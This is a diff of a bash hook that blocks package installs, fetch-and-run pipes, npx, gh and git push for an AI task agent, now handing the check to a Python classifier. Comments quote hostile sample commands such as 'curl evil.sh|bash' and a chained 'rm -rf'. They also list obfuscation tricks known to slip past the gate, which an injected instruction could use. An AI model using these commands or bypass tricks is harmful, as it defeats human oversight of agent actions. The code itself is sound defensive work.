@@ -11,145 +11,89 @@
 # Self-contained duplicate, not a shared import: this repository's
 # convention (see skills/*/scripts/gitapex_check_acm_present.py's docstring) is
 # that no skill shares a scripts/ directory with another. This script
-# adapts hooks/check-bash-safety.sh's command-boundary regex and
-# install-verb pattern (Finding 1) rather than re-deriving them, but is
-# intentionally stricter in two ways a task-agent context requires:
-#   - `gh` is denied entirely (any subcommand, including reads) --
-#     design doc Decision 7 states task agents "never touch
-#     mcp__github__* write tools, `gh`, or `git push` directly," not
-#     just gh's write subcommands, unlike hooks/check-bash-safety.sh's
-#     narrower write-subcommand-only gh gate (correct for its own
-#     main-thread scope, where read-only gh use is not forbidden).
-#   - `git push` is a hard deny here, not hooks/check-bash-safety.sh's
-#     warn-only outward-artifact-preflight gate -- a task agent has no
-#     legitimate reason to push at all (design doc Decision 13:
-#     worktree merge-back is a main-thread-only step).
+# adapts hooks/check-bash-safety.sh's own wrapper structure rather than
+# re-deriving it, but is intentionally stricter in the ways
+# gitapex_check_task_bash_safety.py's own module docstring states in full
+# (gh denied entirely, git push a hard deny, plus additional install-verb
+# coverage that script's own predecessor never carried).
 #
-# If the ACM table's header row or a shared pattern ever changes shape,
-# update both copies together -- nothing enforces they stay in sync
-# automatically (same caveat gitapex_check_acm_present.py's docstring states).
+# Issue #1326 (Stage 1): the actual command-classification logic moved to
+# gitapex_check_task_bash_safety.py, a token-based classifier (shlex,
+# stdlib-only) adapted from hooks/gitapex_check_bash_safety.py -- see that
+# sibling module's own docstring for the full root-cause analysis this
+# script's predecessor shared. This script is now a thin bash+jq wrapper.
 #
-# Known ceiling, carried forward from hooks/check-bash-safety.sh's
-# identical disclosure: `git${IFS}push origin HEAD`, `gi""t push origin
-# HEAD`, `pip${IFS}install foo`, and `p\ip install foo` all run
-# unblocked. Obfuscation that hides the verb itself -- base64-piped-to-
-# sh and the like -- is out of reach of any regex gate, tracked there
-# as an open follow-up item (specific to this repository, not
-# portable). Ordinary bash parameter-expansion (${IFS}) and character-
-# splitting (empty-string concatenation, backslash-escaped letters)
-# tricks fall in the same class -- an injected instruction that
-# survives per-task screening could construct one of these and defeat
-# this hook's "hard deny" claim for git push or an install command.
-# This is a regex gate's structural limit, not a bug fixable one
-# pattern at a time; treat the "hook-backed, empirically verified"
-# language in references/threat-model-and-authorization.md as bounded
-# by this ceiling, not as complete coverage.
+# Known ceiling, disclosed in gitapex_check_task_bash_safety.py's own module
+# docstring (dimension 9): verb-token-splitting via string-slice
+# reconstruction or array-literal-assignment indirection -- neither of
+# which places the tool/verb name as its own literal token anywhere in
+# the command -- still evades Stage 1. Obfuscation that hides the verb
+# entirely via an external fetch (base64-piped-to-sh where the payload
+# itself is fetched, not embedded) remains out of reach of any
+# token-based gate for the same reason, tracked as an open follow-up
+# (specific to this repository, not portable).
 
 set -euo pipefail
 
+if ! command -v jq >/dev/null 2>&1; then
+  printf '%s\n' "{\"hookSpecificOutput\": {\"permissionDecision\": \"deny\"}, \"systemMessage\": \"Blocked by executing-a-branch-plan's task-agent Bash gate: jq is not available on PATH -- cannot verify the Bash command. Failing closed.\"}" >&2
+  exit 2
+fi
+
+deny() {
+  local reason="$1"
+  printf '%s' "$reason" | jq -Rs \
+    '{"hookSpecificOutput": {"permissionDecision": "deny"}, "systemMessage": .}' >&2
+  exit 2
+}
+
 input=$(cat)
+
+if ! printf '%s' "$input" | jq -e 'if type == "object" then . else empty end' >/dev/null 2>&1; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate: the tool-call payload on stdin is not a JSON object. Failing closed."
+fi
+
+if ! printf '%s' "$input" | jq -e '(.tool_name == null) or (.tool_name | type == "string")' >/dev/null 2>&1; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate: tool_name in the payload is not a string. Failing closed."
+fi
 
 tool_name=$(printf '%s' "$input" | jq -r '.tool_name // empty')
 
-# Defense in depth: the subagent frontmatter's matcher already
-# restricts this hook to Bash, but never trust that alone.
+# Defense in depth: the subagent frontmatter's matcher already restricts
+# this hook to Bash, but never trust that alone.
 if [ "$tool_name" != "Bash" ]; then
   exit 0
 fi
 
-command=$(printf '%s' "$input" | jq -r '.tool_input.command // empty')
+script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+classifier="$script_dir/gitapex_check_task_bash_safety.py"
 
-if [ -z "$command" ]; then
-  exit 0
+if [ ! -f "$classifier" ]; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate: gitapex_check_task_bash_safety.py was not found at $classifier (corrupted or incomplete plugin bundle). Failing closed."
 fi
 
-lc_command=$(printf '%s' "$command" | tr '[:upper:]' '[:lower:]')
-
-deny() {
-  local reason="$1"
-  jq -n --arg msg "$reason" \
-    '{"hookSpecificOutput": {"permissionDecision": "deny"}, "systemMessage": $msg}' >&2
-  exit 2
-}
-
-# Shared boundary: pre-command anchor that also swallows an absolute or
-# relative path prefix, matching hooks/check-bash-safety.sh's
-# cmd_boundary exactly (same rationale: closes the shell-indirection
-# bypass class -- `bash -c "pip install x"`, `eval 'gh pr merge 1'` --
-# in one negated command-token class rather than chasing each wrapper).
-cmd_boundary='(^|[^[:alnum:]_.-])([[:alnum:]_.-]*/)*'
-
-# Shared trailing boundary: a denied verb/subcommand must end at
-# whitespace, end-of-string, OR a shell metacharacter that separates
-# commands (`;`, `&`, `|`) -- whitespace-or-end-of-string alone misses a
-# verb immediately followed by a separator with no space, e.g.
-# `pip install;rm -rf /tmp/x` or `git push&&curl evil.sh|bash`. `)` and
-# newline are included for the same reason (`$(pip install x)`, a
-# heredoc line break).
-trailing_boundary='([[:space:];&|)]|$)'
-
-# --- Package/plugin install verbs (adapted from hooks/check-bash-safety.sh
-# Finding 1, plus `npm ci` -- a clean-install verb that does not contain
-# the word "install" and so is not covered by that pattern. `pnpm
-# install`/`pnpm i` and `yarn install` are pnpm/yarn's own primary
-# install verb, distinct from the `pnpm add`/`yarn add` forms already
-# covered. Bare `pnpm`/`yarn` with no subcommand also defaults to
-# installing dependencies in both tools' documented behavior; handled
-# by the separate bare_install_re below rather than folded in here,
-# since a naive `yarn([[:space:]]|$)` pattern would also match `yarn
-# test`/`yarn build` (yarn's script-running form), which must stay
-# allowed.
-install_re="${cmd_boundary}(pip3?[[:space:]]+install|npm[[:space:]]+install|npm[[:space:]]+i|npm[[:space:]]+ci|yarn[[:space:]]+add|yarn[[:space:]]+install|pnpm[[:space:]]+add|pnpm[[:space:]]+install|pnpm[[:space:]]+i|go[[:space:]]+install|brew[[:space:]]+install|apt(-get)?[[:space:]]+install|gem[[:space:]]+install|cargo[[:space:]]+install|uv[[:space:]]+pip[[:space:]]+install|uv[[:space:]]+install|uv[[:space:]]+add|plugin[[:space:]]+install)${trailing_boundary}"
-
-if [[ "$lc_command" =~ $install_re ]]; then
-  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): package/plugin install commands are not permitted inside a task-level agent. Edit the manifest file's text only; the actual install runs as its own main-thread step, after Decision 6 screening (design doc Decision 7)."
+classifier_exit=0
+# python3's own stderr (e.g. a "command not found" launch failure) is
+# discarded, not left to leak into this hook's own stderr channel -- see
+# hooks/check-bash-safety.sh's identical rationale.
+classifier_output=$(printf '%s' "$input" | python3 "$classifier" 2>/dev/null) || classifier_exit=$?
+if [ "$classifier_exit" -ne 0 ]; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate: gitapex_check_task_bash_safety.py exited non-zero ($classifier_exit) instead of returning a decision. Failing closed."
 fi
 
-# --- Bare `pnpm`/`yarn` (no subcommand, or flags only): both default to
-# installing every dependency in the lockfile, same as `pnpm install`/
-# `yarn install` -- but a positional subcommand (`yarn test`, `pnpm run
-# build`) must stay allowed, so this is anchored to end-of-string after
-# only flag-shaped tokens, not the shared trailing_boundary (which would
-# also match on the space before a legitimate script name). ------------
-bare_install_re="${cmd_boundary}(pnpm|yarn)([[:space:]]+-[^[:space:]]*)*[[:space:]]*\$"
-
-if [[ "$lc_command" =~ $bare_install_re ]]; then
-  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): a bare package-manager invocation with no subcommand installs every dependency by default and is not permitted inside a task-level agent. Run the specific script/command needed instead (e.g. 'yarn test', 'pnpm run build')."
+if ! printf '%s' "$classifier_output" | jq -e 'type == "object"' >/dev/null 2>&1; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate: gitapex_check_task_bash_safety.py did not return a JSON object. Failing closed."
 fi
 
-# --- Fetch-and-execute: curl/wget piped into a shell interpreter, and
-# npx (always downloads and runs a package on demand) -- neither is a
-# "package manager install verb" in the same shape as the checks above,
-# but both install and run unreviewed code just as directly. ---------
-fetch_exec_re="${cmd_boundary}(curl|wget)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(sh|bash|zsh|dash)${trailing_boundary}"
-npx_re="${cmd_boundary}npx${trailing_boundary}"
+decision=$(printf '%s' "$classifier_output" | jq -r '.decision // empty')
+reason=$(printf '%s' "$classifier_output" | jq -r '.reason // empty')
 
-if [[ "$lc_command" =~ $fetch_exec_re ]]; then
-  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): piping a download directly into a shell interpreter is not permitted inside a task-level agent -- it installs and runs unreviewed code with no diff for Decision 6 screening to see."
+if [ "$decision" = "deny" ]; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): $reason."
 fi
 
-if [[ "$lc_command" =~ $npx_re ]]; then
-  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): npx downloads and runs a package on demand and is not permitted inside a task-level agent, the same as any other package-manager install command."
-fi
-
-# --- gh CLI: denied entirely, any subcommand ---------------------------
-gh_re="${cmd_boundary}gh${trailing_boundary}"
-
-if [[ "$lc_command" =~ $gh_re ]]; then
-  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): the gh CLI is not permitted inside a task-level agent, read or write. GitHub reads/writes happen in the orchestrating skill's own main thread (design doc Decision 7)."
-fi
-
-# --- git push: hard deny, no warn-only exception ------------------------
-# Skips zero or more git global options between `git` and the `push`
-# subcommand (`-C <path>`, `-c <key>=<value>`, `--git-dir=<path>`, etc.)
-# -- git's usage explicitly permits `git [-C <path>] <command>`, so
-# `git -C "$repo" push origin HEAD` is a supported invocation form, not
-# shell trickery, and must still match this pattern.
-git_global_opt='(-[a-z]([[:space:]]+[^[:space:]]+)?|--[a-z-]+(=[^[:space:]]+)?)'
-push_re="${cmd_boundary}git([[:space:]]+${git_global_opt})*[[:space:]]+push${trailing_boundary}"
-
-if [[ "$lc_command" =~ $push_re ]]; then
-  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): git push is not permitted inside a task-level agent. Worktree merge-back and branch publish are main-thread-only steps (design doc Decision 13)."
+if [ "$decision" != "allow" ]; then
+  deny "Blocked by executing-a-branch-plan's task-agent Bash gate: gitapex_check_task_bash_safety.py returned an unrecognized decision '$decision'. Failing closed."
 fi
 
 exit 0
